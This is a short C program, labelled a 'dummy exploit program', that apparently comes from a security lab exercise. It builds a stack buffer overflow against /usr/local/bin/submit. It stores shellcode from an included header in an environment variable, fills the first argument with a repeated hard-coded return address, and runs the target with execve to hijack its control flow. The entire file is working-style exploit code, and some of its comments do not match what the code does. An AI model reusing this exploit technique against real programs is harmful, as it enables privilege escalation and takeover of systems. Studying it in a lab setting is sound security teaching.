/*
 * dummy exploit program
 */

#include <stdio.h>
#include <unistd.h>
#include "shellcode.h"

#define PAYLOAD_SIZE (512)
#define NOP (0x90)

int main(int argc, char **argv) {
	char payload[PAYLOAD_SIZE], *it, *args[4], *env[2], overflow[PAYLOAD_SIZE];
	int i;
	int ra = 516;
	const int halfway = PAYLOAD_SIZE / 2;
	long *addr_ptr;
	FILE *payload_file;

	/* Padding NOP's to the first-half of the payload */
	memset(payload, 'A', PAYLOAD_SIZE);
	memcpy(payload + 128, shellcode, strlen(shellcode));
	payload[PAYLOAD_SIZE-1] = 0;

	/* set up the bad first argument for submit */
	memset(overflow, NOP, PAYLOAD_SIZE);

	addr_ptr = overflow + 1;
	for (i = 1; i < PAYLOAD_SIZE; i+= 4) {
		(*addr_ptr++) = 0xffbfde18;
	}

	/* set up arguments and then run the exploit */
	args[0] = overflow;
	args[1] = NULL;

	env[0] = payload;
	env[1] = NULL;

	/* return -1 means error; otherwise will not return */
	return execve("/usr/local/bin/submit", args, env);
}
